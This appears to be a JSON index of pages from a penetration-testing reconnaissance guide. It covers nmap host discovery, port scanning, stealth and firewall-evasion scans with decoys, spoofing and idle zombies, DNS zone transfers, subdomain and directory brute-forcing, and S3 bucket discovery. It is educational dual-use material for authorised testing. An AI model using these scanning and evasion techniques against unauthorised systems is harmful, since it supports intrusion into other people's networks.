[
  {
    "objectID": "d1fb7158db4895c0da090e1a0a4c25fd",
    "u": "https://recon.tymyrddin.dev/",
    "t": "Falconry ",
    "c": "Falconry  Getting to know the target using methods like researching publicly available information and network scanning. Preparation Build a local testlab Footprinting Introduction Gather network information Gather system information Collect organisation information Initial scanning Introduction War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion Canopy of apple-blossom Introduction Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting API Mayhem Introduction Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets Head in the clouds Introduction Mapping endpoints Investigating AWS S3 URLs Pocketful of acorns Introduction Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54d37ed8ae0101af9f5cf86095e2c0d5",
    "u": "https://recon.tymyrddin.dev/docs/scanning/service-and-os",
    "t": "Service and OS detection ",
    "c": "Service and OS detection  Detect Operating Systems Detect services Service and OS detection use different methods to determine the operating system or service running on a particular port. Detect services: # nmap -sV -T4 -Pn -oG ServiceDetect -iL $TARGETFILE OS detection: # nmap -O -T4 -Pn -oG OSDetect -iL $TARGETFILE",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "516b73f997f19907408cf9a557036fbf",
    "u": "https://recon.tymyrddin.dev/docs/api/parameters",
    "t": "Document key parameters ",
    "c": "Document key parameters  An API’s attack surface includes the inputs and outputs of the API. Using the inputs and outputs, determine the potential vulnerabilities in the API. These inputs and outputs include: API calls URL parameters Headers Cookies Web responses File uploads API keys Identify the inputs and outputs of the API: The inputs and outputs of an API can be identified by the endpoints that the API provides. Make requests to different endpoints, interacting with the resources that the API exposes. The responses that the API sends back will contain the information necessary to understand the structure of the data being returned. Resources  API Security Top 10 2019",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17825e36126dfc3ace6f87d8ffb5728c",
    "u": "https://recon.tymyrddin.dev/docs/scanning/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use … Why?  To find potential initial vulnerable attack vectors. How?  War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP (ping sweep) Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "738465a0e68d71e161decdd51698ce1f",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/network",
    "t": "Gather network information ",
    "c": "Gather network information  Domains Subdomains IP addresses Whois and DNS records Whois and IP Geolocation  Whois databases contain domain owners’ personal information and are maintained by the Regional Internet Registries. Thick whois contains all information from all registrars for the specified set of data. Thin whois contains limited information about the specified set of data. Whois query results typically include: Domain details Domain owner details Domain server Net range Domain expiration Creation and last update dates Regional Internet Registries, which maintain the whois databases, include: Reseaux IP Europeens Network Coordination Centre (RIPE) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin America and Caribbean Network Information Centre (LACNIC) Africa’s NIC (AFRINIC) IP Geolocation  IP geolocation helps find location information about a target such as country, city, postal code, ISP, and so on. This informationis useful for (planning) social engineering attacks on the target. DNS footprinting  DNS footprinting involves collecting information about DNS zone data, which includes information about server types and locations of key hosts in the network. Network Footprinting  Network footprinting refers to the process of collecting information about the target’s network. During this process, attackers collect network range information and use the information to map the target’s network. Network range gives attackers an insight into how the network is structured and which machines belong to the network. Nmap can be used for network discovery. It uses raw IP packets to determine the available hosts on the network, the services offered by those hosts, operating systems they are running, firewall types that are being used, and other important characteristics. Traceroute programs uses the ICMP protocol and the TTL field in the IP header to discover a route to the target host. It records IP addresses and DNS names of discovered routers underway. This information can be used for man-in-the-middle and other related attacks. The results of a traceroute can also be used to collect information about network topology, trusted routers, and firewall locations, useful for creating network diagrams and planning attacks.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b9473199958a0f7470288675561f1f33",
    "u": "https://recon.tymyrddin.dev/docs/cloud/map",
    "t": "Mapping endpoints ",
    "c": "Mapping endpoints  Collect information to identify assets a target has across all cloud providers. Identify services hosted with third-party companies. Map out all the endpoints: user interface, APIs, subnetworks, etc. for which testing is to be done. Decide which endpoints to exclude based on policy restrictions, user permissions, etc. Decide the route for performing the pentest: from application or database. Figure out how well the application server and VMs can take the load of the tests. Find out the laws that need to be followed while performing tests. Figure out which tools to use and what types of tests to do on which endpoints (Automated or Manual). Get approval for the plan from the client and inform them when you wish to begin.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff9b63c2a2b9b13ace655d24f5a3566",
    "u": "https://recon.tymyrddin.dev/docs/scanning/firewall",
    "t": "Firewall evasion ",
    "c": "Firewall evasion  Fragment packets: # nmap -f <IP> Most firewalls and IDS detect fragmented packets. The nmap --mtu command allows for specifying offset size (has to be a multiple of 8). This is similar to the packet fragmentation technique. During the scan, nmap creates packets of that size, causing confusion to the firewall. # nmap --mtu [MTU] <IP> Decoy: # nmap -D RND:[number] <IP> Idle zombie scan: # nmap -sI [zombie] <IP> Manually specify a source port: # nmap --source-port [port] <IP> Append random data: # nmap --data-length [size] <IP> Randomize target scan order: # nmap --randomize-hosts <IP> Spoof MAC address: # nmap --spoof-mac [MAC|0|vendor] <IP> Send bad checksums: # nmap --badsum <IP> The badsum command deploys an invalid TCP/UDP/SCTP checksum for packets transmitted to the target. Practically every host IP stack will correctly drop the packets, so each response accepted is possibly originating from a firewall or Intrusion Detection System that was not concerned with confirming the checksum.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "60ee3fc55140efa070290625facf78dd",
    "u": "https://recon.tymyrddin.dev/docs/scanning/tcp",
    "t": "Host discovery with TCP ",
    "c": "Host discovery with TCP  Split port scans by port number Low TCP port scans Medium TCP port scans High TCP port scans Split scans  Split the scans to get a set of results back in a shorter period of time. This makes it possible to start testing while the remaining results come back. By the time medium port scans are finished, underlying services of the lower ports have probably been enumerated. Use ports 0-1024 for the low range (System Ports). These scans cover services such as SMTP, Windows File Sharing, HTTP, HTTPS and other commonly found services. For medium port use ports 1025-32767 (the bulk of the User Ports). These cover NFS, Sun RPC Port Mapper, X-Windows, VNC, Microsoft Terminal Services, etc. The high port scans are for ports in the range 32768-65535 (the lesser used User Ports and Dynamic or Ephemeral ports). Hints  Do not ping the target in these scans because there may be filtering in place, which could result in pings failing and nmap accidentally concluding that a host is down. Under the hood  TCP SYN (Stealth) scan ( -sS ) is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy, since it never completes TCP connections. It works against any compliant TCP stack, and allows clear, reliable differentiation between open, closed, and filtered states. Nmap starts by sending a TCP packet with the SYN flag set and the target send back a response with the SYN and ACK flags. NMap does not complete the handshake with the expected ACK and the OS suddenly receives a SYN/ACK while it hasn’t requested (NMap did). The OS responds to the unexpected SYN/ACK with an RST packet. All RST packets in such scenarios also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning. If a service is listening on a port and someone makes a connection to it (by sending a SYN packet), the service will send a SYN/ACK packet in return. That means that there is a machine at that IP address. Note that some operating systems will respond with a SYN/ACK to SYN s sent to ports used for outbound TCP connections, while others will not. If no service is listening on that port but the machine is up and running and on the network, a reset ( RST ) packet will be sent back. That means there is nothing listening on that port, but having sent something in return means that a machine is at that IP address. If nothing is received after sending a SYN packet, it means there is no host at that IP address OR a firewall is blocking traffic OR the host is down. Port 80 is therefore extremely useful for ping sweeps, because most firewalls and port filters do not block web traffic. Send Receive Send Assumption SYN SYN/ACK ACK followed by RST Port is open, host is up SYN RST - Port is closed, host is up SYN Nothing - Port is blocked by firewall, host is down, or there is no host at that IP address. Interpreting portscan outputs  Some puzzling with indicators will help: Anything from 40000 onwards could be anything and only be temporary NFS can run on any port, but the Linux NFS Kernel server implementation always runs on port 2049 by default. VNC clients typically are on port 5900+ If port 5900 AND 5901 are open, most likely 5901 is a second VNC service. If port 5901 is open and 5900 closed, who knows? TCP port 8080 open can indicate a proxy server, or something like Apache Tomcat, or … A Windows Active Directory controller will have TCP ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 636 (LDAP/S) and the common NetBIOS and Windows File Sharing ports 135 (used for RPC comms for AD replication), 139 (Authentication) and 445 (used for a whole host of services including file sharing and authentication) Windows systems tend to use TCP port 3389 for Microsoft Remote Desktop Protocol access. Unix-like systems often use text-based protocols on TCP ports 22 (SSH), 23 (Telnet) and 514 (RSH), or network-based Windowing protocols on TCP ports such as 590x (VNC) or 600x (X11). Examples  Low TCP port scans: # nmap -sS -PN -p 0-1024 -n -iL $TARGETFILE -oA nmap/tcp-lo The result is an open port list, with port and protocol, the port’s state and the by IANA allocated service for that port. This does not mean that a port actually runs that service. Medium TCP port scans: # nmap -sS -PN -p 1025-32767 -n -iL $TARGETFILE -oA nmap/tcp-med Remaining TCP port scans: # nmap -sS -PN -p 32768-65535 -n -iL $TARGETFILE -oA nmap/tcp-hi Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9eeb2329002066a0902a656ee46d6c70",
    "u": "https://recon.tymyrddin.dev/docs/physical/facilities",
    "t": "Recon of facilities ",
    "c": "Recon of facilities  Organisations can use a number of physical security controls to regulate who gains access to the facility or what areas in the facility they gain access to. See if you can bypass the security to gain access to areas of facilities you should not have access to. Resources  Guidelines for Performing Physical Security Tests on Facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "439632600c2c42ec4725efa6ef2a8c2e",
    "u": "https://recon.tymyrddin.dev/docs/cloud/s3-urls",
    "t": "Investigating AWS S3 URLs ",
    "c": "Investigating AWS S3 URLs  Endpoints  S3 endpoint is a region-specific URL that is used in both S3 URL styles. Most of the endpoints follow this pattern (with region names being eu-west-1 , us-west-2 , etc): s3-REGION.amazonaws.com And there are some oddities useful to know. Two endpoints that do not follow the above pattern are those of the us-east-1 region. For that region endpoints are synonyms and both point to the same place: s3.amazonaws.com s3-external-1.amazonaws.com Further, the eu-central-1 (Frankfurt) and ap-northeast-2 (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (the first dash is replaced by dot): s3-eu-central-1.amazonaws.com s3.eu-central-1.amazonaws.com s3-ap-northeast-2.amazonaws.com s3.ap-northeast-2.amazonaws.com S3 bucket URL schemes  According to the S3 Developer Guide (PDF, p.57), S3 supports both virtual-hosted and path URL styles for bucket access. Path style URL  In path style URL, the bucket name is appended to the domain name and is a part of the URL path: http://s3endpoint/<bucket-name> Virtual-hosted style URL  In virtual-hosted style URL the bucket name becomes a subdomain: http://BUCKET.s3endpoint Static Website Hosting Endpoints  Using S3’s Static Website Hosting feature requires using Website Endpoints. There are two general forms of S3 website endpoint: http://BUCKET.s3-website-region.amazonaws.com http://BUCKET.s3-website.region.amazonaws.com Most of the regions follow the first form, while eu-central-1 and ap-northeast-2 follow the second. Presigned URL  Users can create a presigned URL for an object, for which security credentials, a bucket name, an object key, an HTTP method (GET to download the object), and an expiration date and time are given. The presigned URLs are valid only for the specified duration. If a presigned URL is made using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time. Anyone who receives the presigned URL can then access the object. Because presigned URLs grant access to the Amazon S3 buckets to whoever has the URL, Amazon recommends they be protected appropriately . Something often forgotten, apparently. Getting it, but not quite.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "117bf72c53eedd74731f47621540303a",
    "u": "https://recon.tymyrddin.dev/docs/cloud/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Cloud recon. Focus on S3 first. The growing number of Amazon Web Services S3 “data leaks” are due to human intervention – specifically, users who have not correctly configured S3 bucket policies, and as a result, allow public access to S3. In general, a lack of understanding when implementing S3, or carelessness when evaluating what should or should not be available for public consumption. Why?  To gain information for initial access in the cloud. How?  Mapping endpoints and plan Investigating AWS S3 URLs",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "99f2c2f99f7d5f85c1898215c9e40a69",
    "u": "https://recon.tymyrddin.dev/docs/api/secrets",
    "t": "Check for exposed secrets ",
    "c": "Check for exposed secrets  The authentication mechanism is used to identify the user and ensure that they are authorized to access the API. The authentication mechanism is usually a username and password, but it can also be a token or a certificate. It also gives clues to potential vulnerabilities in the API. If the authentication mechanism is weak, then the API is more vulnerable to attack. Resources  API Security Top 10",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dd3825e3f3fb61448b666dffc1f7a801",
    "u": "https://recon.tymyrddin.dev/docs/app/techstack",
    "t": "Tech stack fingerprinting ",
    "c": "Tech stack fingerprinting  Fingerprinting techniques can help you understand the target application even better. Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to perform targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version. Run Nmap on a machine with the -sV flag on to enable version detection on the port scan. In Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. Many web frameworks or other technologies will embed a signature in source code. Right-click a page, select View Source Code , and press CTRL-F to search for phrases like powered by , built with , and running . Check technology-specific file extensions, filenames, folders, and directories. Wappalyzer is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. BuiltWith is a website that shows you which web technologies a site is built with. StackShare is an online platform that allows developers to share the tech they use. Maybe the organisation’s developers have posted their tech stack. And Retire.js is a tool that detects outdated JavaScript libraries and Node.js packages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a266ac0d06711e4fbb3260fc2906110",
    "u": "https://recon.tymyrddin.dev/docs/scanning/stealth",
    "t": "Stealth scans ",
    "c": "Stealth scans  Stealth  Never use connect scan ( -sT ), which establishes a full connection to a port, if one wishes to remain stealthy. Excessive port connections can create a DoS condition on older boxes, and will raise the alarms on any IDS. Use a stealthy port-scanning method with nmap, such as a TCP SYN scan (sometimes called a half-open scan). It is not only stealthy, it is also lighter on both systems, source and target. Mask your IP from the target (Don’t expect to find possibilities for either of these two all the time, but do keep looking, especially among older systems not offering useful services.): Use an FTP bounce scan if possible. Some ftp servers allow anonymous users to proxy connections to other systems. If you find an anonymous ftp server during enumeration, or you know of one to which you have login credentials, try using the -b option with user:pass@server:ftpport . If the server does not require authentication, you can skip the user:pass and if it is running on the standard port you can also leave out the ftpport part. This only works on some ftp servers. Many ftp servers today have this option disabled (by default). Idle scan gives a similar result but uses a different type of scanning. If you can identify an intermediate machine (a zombie) with low traffic and predictable fragment identification values (IP ID) you can send spoofed packets to your target, with the source set to the zombie with -sI zombiehost:port . An IDS will see the idle scan target as the system doing the scanning. If the idle target is a by your target trusted machine that can bypass host-based access control lists, jackpot!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6342ea6759dd923f27e88734c46e6acf",
    "u": "https://recon.tymyrddin.dev/docs/app/stroll",
    "t": "Manually walk through the target ",
    "c": "Manually walk through the target  Manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don’t usually use. Get a rough idea of what the attack surface (all the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6271cfa9c8df69dc86ca8854add5e18",
    "u": "https://recon.tymyrddin.dev/docs/scanning/icmp",
    "t": "Host discovery with ICMP ",
    "c": "Host discovery with ICMP  The easiest and fastest way to discover if a host is up or not is by trying to send some ICMP packets. Send an echo request using a simple ping or fping (for ranges). If pinging a single host works, try a ping-sweep: Send out ICMP echo requests to every system on a particular network or subset of a network to determine which hosts are up. ICMP error messages can be used to mask the source of a Distributed Denial of Service attack, and with such attacks being common, ICMP error rate limiting is often applied. To avoid filters to common ICMP echo request-response, use nmap to send other types of ICMP packets. If scans still take incredibly long, try discovering hosts with a SYN scan or UDP scan instead. Examples  Send a single echo request # ping -c 1 192.168.122.10 Send echo requests to ranges: # fping -g 192.168.122.0/24 Using nmap, send echo, timestamp requests and subnet mask requests: # nmap -PEPM -sP -n 192.168.122.0/24",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "669a9cd0954ec976c9347b7e46848a15",
    "u": "https://recon.tymyrddin.dev/docs/scanning/hosts",
    "t": "Live host discovery ",
    "c": "Live host discovery  Types of scans  ARP, ICMP, TCP, and UDP can detect live hosts. Any response from a host is an indication that it is online. Scan Type Example Command ARP Scan sudo nmap -PR -sn /24 ICMP Echo Scan sudo nmap -PE -sn /24 ICMP Timestamp Scan sudo nmap -PP -sn /24 ICMP Address Mask Scan sudo nmap -PM -sn /24 TCP SYN Ping Scan sudo nmap -PS22,80,443 -sn /30 TCP ACK Ping Scan sudo nmap -PA22,80,443 -sn /30 UDP Ping Scan sudo nmap -PU53,161,162 -sn /30 Options  Option Purpose -n no DNS lookup -R reverse-DNS lookup for all hosts -sn host discovery only",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c795c53795ef1db0037e6f7bdcee1f11",
    "u": "https://recon.tymyrddin.dev/docs/api/collect-data",
    "t": "Collect data ",
    "c": "Collect data  Collect data from applications through automated and manual means. Scan for open ports and services using shodan Use an application as intended Inspect web application with DevTools Search for API-related directories Discover API endpoints From here: an entry point (typically using the root URI of “/”) contains links to other REST APIs. Those APIs will contain links to other APIs and so on. Ideally, there is no API that does not have a link to it. Tools  Kiterunner Nikto OWASP ZAP",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0aa1ce3d047d15d68e4a4414feb546fc",
    "u": "https://recon.tymyrddin.dev/docs/scanning/udp",
    "t": "Host discovery with UDP ",
    "c": "Host discovery with UDP  Split port scans by port number Low UDP port scans Remaining UDP port scans Relationship with ICMP  UDP is a stateless protocol. It was designed for applications that do not care whether a packet is received. This could saturate a link, and ICMP is used in its congestion control. Because UDP is stateless, it is easy to spoof using ICMP error messages to mask the source of a Distributed Denial of Service attack, and with such attacks common, UDP scans are considered bad and ICMP error rate limiting good. With 65,535 ports to scan and error rate limits of 1 ICMP message per second, it can take 9+ hours to scan some hosts. Solutions are scanning multiple hosts in parallel, scanning popular ports first, and ignoring ports that require specific protocols and scanning those separately. Older versions of Windows (and some configurations of current Windows systems) do not implement ICMP error rate limiting. Knowing beforehand which are Windows systems, these can be put on a separate IP list. Not responding  UDP services are highly unlikely to respond to a regular empty UDP probe datagaram because the underlying application does not receive a packet that causes it to respond. The solution is to send a packet related to the most likely service (based on port number) running under it. For example, brute forcing SNMP on port 161 could be worthwhile and sending a correctly formed DNS query datagram to UDP port 53 will likely give a useful response. Interpreting portscan outputs  nmap will report a lot of closed ports, and some as open|filtered . The latter means that nmap did not receive a response. Use a combination of ICMP and IP to whittle things down: An open port will respond to a correctly formed application message if the service is supposed to respond to that message A closed port will lead to an ICMP port unreachable from the device (or a similar destination unreachable message from a nearby device) A filtered port will occasionally result in a message, but more often than not, nothing If a packet’s TTL expires an ICMP TTL Expired In Transit message is sent from the router the datagram is currently passing through to the packet’s source Examples  Low UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 0-1024 -oA nmap/udp-lo -sV Expect to find 53, 111 and 137 open. Remaining UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 1025-65535 -oA nmap/udp-full -sV Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b01e41888e428481743749b796e42f7",
    "u": "https://recon.tymyrddin.dev/docs/scanning/ports",
    "t": "Port scanning ",
    "c": "Port scanning  Types of scans  Port Scan Type Example Command TCP Connect Scan nmap -sT TCP SYN Scan sudo nmap -sS UDP Scan sudo nmap -sU TCP Null Scan sudo nmap -sN TCP FIN Scan sudo nmap -sF TCP Xmas Scan sudo nmap -sX TCP Maimon Scan sudo nmap -sM TCP ACK Scan sudo nmap -sA TCP Window Scan sudo nmap -sW Custom TCP Scan sudo nmap --scanflags URGACKPSHRSTSYNFIN Spoofed Source IP sudo nmap -S SPOOFED_IP Spoofed MAC Address --spoof-mac SPOOFED_MAC Decoy Scan nmap -D DECOY_IP,ME Idle (Zombie) Scan sudo nmap -sI ZOMBIE_IP Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Options  Option Purpose -p- all ports -p1-1023 scan ports 1 to 1023 -F 100 most common ports -r scan ports in consecutive order -T<0-5> T0 being the slowest and T5 the fastest --max-rate 50 rate <= 50 packets/sec --min-rate 15 rate >= 15 packets/sec --min-parallelism 100 at least 100 probes in parallel --source-port PORT_NUM specify source port number --data-length NUM append random data to reach given length Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports. Option Purpose --reason explains how Nmap made its conclusion -v verbose -vv very verbose -d debugging -dd more details for debugging",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "682e6c01de9ffba0dd3f030fb4db3374",
    "u": "https://recon.tymyrddin.dev/docs/app/dns",
    "t": "Scope discovery ",
    "c": "Scope discovery  Gather deeper and wider Discover websites on the same server Discover subdomains Discover email addresses Discover sensitive files WHOIS and Reverse WHOIS  Use whois to gather Domain name, IP address, Administrative Details, autonomous system number, DNS Go to www.arin.net/whois and search for target name in the ARIN Whois/RDAP Search bar. Find a handle which displays more information about this registration including the range of IP addresses. Find an entry with a net range (public IPs). Determine all the public IP blocks the target may have. If you cannot find any results try some other Whois database search sites. IP addresses  nslookup www.target.com Setting the type of query to MX (mail exchange) records: nslookup set type=MX target.com Then use nslookup again to resolve the FQDNs of the mail servers to IP adressess. Try a DNS zone transfer: nslookup server <ip_or_fqdn_of_target_DNS_server> set type=all ls -d <target_domainname> If successful, make a note of it and add it to the remediation list in the pentest report. Researching certificates  Another way of finding hosts is to take advantage of the Secure Sockets Layer(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh , Censys , and Cert Spotter to find certificates for a domain. 👉 Wildcard certificates are a single point of failure. If we stumble upon the private key while roaming the network, we could intercept the communication flow of all applications using that same parent domain. When a certificate authority issues a certificate, these are entered into a central repository called a certificate log. This repository keeps a binary tree of all certificates, where each node is the hash of its child nodes, thereby guaranteeing the integrity of the entire chain. All issued TLS certificates should be publicly published to detect domain spoofing, typo-squatting, homograph attacks, and other mischievous ways to deceive and redirect users. These logs can be searched. Secret applications with little security hiding behind proxies can be exposed, and minimally subdomain enumeration is way faster. Subdomain enumeration  After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents a new angle for attacking the network. The best way to enumerate subdomains is to use automation. Tools like Sublist3r , SubBrute , Amass , and Gobuster can enumerate subdomains automatically with a variety of wordlists and strategies. For example, Sublist3r works by querying search engines and online subdomain databases, while SubBrute is a brute-forcing tool that guesses possible subdomains until it finds real ones. Amass uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains. You can build a tool that combines the results of multiple tools to achieve the best results. Service Enumeration  Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning. In active scanning, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look for open ones. You can use tools like nmap or masscan for active scanning. In passive scanning, third-party resources are in use to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use Shodan , Censys and Project Sonar . Combine the information gathered from different databases for the best results. Enumerate webserver directories  The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server. Even if you can’t find any immediate exploits, directory information often tells you about the structure and technology of an application. The nmap NSE script http-enum.nse offers a quite extensive fingerprint, especially when including Nikto database, but there are no guarantees all will be seen. And Nikto is very noisy. You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what An example of running a Dirsearch command. The -u flag specifies the hostname, and the -e flag specifies the file extension to use when constructing URLs: ./dirsearch.py -u target_url -e php Gobuster’s dir mode can be used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this mode, you can use the -u flag to specify the domain or subdomain you want to brute-force and -w to specify the wordlist you want to use: gobuster dir -u target_url -w wordlist Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like EyeWitness or Snapper to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained. These are all common places for vulnerabilities to manifest. Spidering the site  Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application. OWASP Zed Attack Proxy (ZAP) has a built-in web spider, and Burp Suite has an equivalent tool called the crawler. Third-party hosting  Take a look at the company’s third-party hosting footprint. For example, look for the organisation’s S3 buckets. A way to find those is through Google dorking. site:s3.amazonaws.com COMPANY_NAME site:amazonaws.com COMPANY_NAME If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs: amazonaws s3 COMPANY_NAME amazonaws bucket COMPANY_NAME amazonaws COMPANY_NAME s3 COMPANY_NAME Another way of finding buckets is to search a company’s public GitHub repositories for S3 URLs. Try searching these repositories for the term s3 . GrayhatWarfare is another online search engine you can use to find publicly exposed S3 buckets. And you can try to brute-force buckets by using keywords. Lazys3 is a useful tool for that. It relies on a wordlist to guess buckets that are permutations of common bucket names. Bucket Stream parses certificates belonging to an organisation and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible. Once you’ve found a couple of buckets that belong to the target organisation, use the AWS command line tool to see if you can access one. Install the tool with: pip...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "96231753af2d5325a33d6b571575598f",
    "u": "https://recon.tymyrddin.dev/docs/physical/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gather information to create an operations plan. In some cases, the client will provide much of the information, like vendors used, photographs of the locations, floorplans, front desk procedures, dress codes, photos of badges, security systems in place. If not, do recon. Why?  Identify vulnerabilities and weaknesses in physical security controls. How?  Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a05f62e88cc94afbe9f6b33a26b11d7",
    "u": "https://recon.tymyrddin.dev/docs/api/burp",
    "t": "Analyse traffic ",
    "c": "Analyse traffic  Pass web service application traffic through a proxy to gather more detail. Using a proxy helps dig into a website and look for vulnerabilities. FoxyProxy is a Firefox extension for switching an internet connection between proxy servers based on URL patterns. It simplifies configuring browsers to access proxy servers. Burp Suite is a popular penetration testing and vulnerability finder tool for checking web application security. To discover hidden flaws, route traffic through a proxy like Burp Suite. FoxyProxy can be used to turn it on and off.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f4610429197f0979ce6050fa01a81bc3",
    "u": "https://recon.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Locate the APIs and validate whether they are operational, find credential information (keys, secrets, usernames, passwords), version information, API documentation, and information about the API’s purpose. Why?  The more information gathered about a target, the better the odds of discovering and exploiting API-related vulnerabilities. How?  Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ba3d3d5b3212810790cf7755baf5a35",
    "u": "https://recon.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Recon strategies for gathering intel on a target. Why?  To discover all the possible ways of attacking a target before deciding on the most effective approach for web application hacking. How?  Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b4558c53e32c537879a01783be1762d",
    "u": "https://recon.tymyrddin.dev/docs/scanning/diving",
    "t": "Diving deeper in discovery ",
    "c": "Diving deeper in discovery  Identify live networks between source and already identified subnets Traceroute to the gateway or DNS server for each network Add newly identified networks to the list of subnets Discover the IP addresses of servers behind a DNS Discover how long a server has been up Where is a server’s physical location … Under the hood  Traceroutes work by manipulating the Time-To-Live (TTL) field in an IP packet. This field tells a device a packet is passing through how many more systems (or hops) a packet can pass through before being dropped. This is to ensure that lost packets do not just simply hop around the Internet forever and eventually, with enough lost packets clogs it up. The field is decremented as it passes through each network hop. When it reaches zero, a router will drop the packet being sent through it and send an ICMP Time-To-Live exceeded message back to the source. This can be used to determine the route to a host or network, the time it takes for a message to be sent and a response to be received by using a traceroute, which service provider the target is using There is an ICMP traceroute (tracert.exe, Windows) and a UDP traceroute (traceroute -l, all other OSs). ICMP traceroute expects all intermediary routers to respond with an ICMP TTL Exceeded message. Most do not (RFC 792) UDP traceroute is not so great where filtering is in place. Most Unix traceroute implementations now support TCP static port traceroutes out of the box. Mapping out DMZ and internal networks  Because all traceroutes work using ICMP TTL Exceeded messages, which protocol is used is not important as long as there is a known response. Use a TCP traceroute with a SYN flag set, and commonly open ports such as 25, 80 or 443 for which you can get a reliable response back once the target is reached. Uptime  Each time a server is patched or updated, it must also be rebooted. If a server has been up for a long time, we know it has not been patched or updated in that time, and 